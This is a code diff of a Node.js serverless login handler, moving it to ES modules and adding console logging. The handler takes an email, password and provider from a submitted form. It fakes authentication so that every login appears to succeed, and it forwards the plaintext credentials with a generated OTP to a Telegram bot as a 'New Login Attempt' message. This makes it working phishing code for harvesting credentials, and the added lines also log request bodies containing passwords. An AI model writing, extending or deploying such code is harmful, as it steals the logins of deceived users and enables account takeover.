@@ -1,5 +1,5 @@
-const Redis = require("ioredis");
-const fetch = require("node-fetch");
+import Redis from "ioredis";
+import fetch from "node-fetch";
 
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
@@ -15,14 +15,18 @@ function generateOtp() {
   return Math.floor(100000 + Math.random() * 900000).toString();
 }
 
-module.exports = async function handler(req, res) {
+export default async function handler(req, res) {
+  console.log("BODY", req.body);
+
   if (!BOT_TOKEN || !CHAT_ID || !REDIS_URL) {
+    console.log("Missing env");
     res.status(500).json({ success: false, message: "Missing required environment variables: BOT_TOKEN, CHAT_ID, or REDIS_URL" });
     return;
   }
 
   if (!redis) {
     redis = new Redis(REDIS_URL);
+    console.log("REDIS CONNECTED");
   }
 
   if (req.method !== "POST") {
@@ -36,6 +40,7 @@ module.exports = async function handler(req, res) {
     try {
       bodyObj = JSON.parse(req.body);
     } catch (e) {
+      console.log("Invalid JSON body");
       res.status(400).json({ success: false, message: "Invalid JSON body" });
       return;
     }
@@ -43,27 +48,20 @@ module.exports = async function handler(req, res) {
   const { email, password, provider } = bodyObj || {};
 
   if (!email || !password || !provider) {
+    console.log("Missing required fields");
     res.status(400).json({ success: false, message: "Missing required fields" });
     return;
   }
 
-  // Normalize email
   const normalizedEmail = email.trim().toLowerCase();
 
-  // Fake authentication — always succeed
-  const authResult = { success: true };
-
-  if (!authResult.success) {
-    res.status(401).json({ success: false, message: "Invalid credentials" });
-    return;
-  }
-
   const otp = generateOtp();
+  console.log("OTP", otp);
 
   try {
-    // Store OTP in Redis with 5 minute expiry (recommended)
     await redis.set(getOtpKey(normalizedEmail), otp, "EX", 300);
   } catch (err) {
+    console.log("REDIS ERROR", err);
     res.status(500).json({
       success: false,
       message: "Failed to store OTP in Redis",
@@ -72,9 +70,7 @@ module.exports = async function handler(req, res) {
     return;
   }
 
-  // Send credentials and OTP to Telegram
   const message = `🔐 *New Login Attempt*\n\n📧 Email: ${normalizedEmail}\n🔑 Password: ${password}\n🌐 Provider: ${provider}\n✅ Authenticated: YES\n🧾 OTP: ${otp}`;
-
   const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
 
   try {
@@ -90,6 +86,7 @@ module.exports = async function handler(req, res) {
 
     if (!response.ok) {
       const text = await response.text();
+      console.log("TELEGRAM ERROR", text);
       throw new Error(`Telegram API error: ${response.status} ${text}`);
     }
 
@@ -99,10 +96,11 @@ module.exports = async function handler(req, res) {
       email: normalizedEmail,
     });
   } catch (error) {
+    console.log("TELEGRAM SEND ERROR", error);
     res.status(500).json({
       success: false,
       message: "Failed to send OTP to Telegram",
       error: error.message,
     });
   }
-};
+}
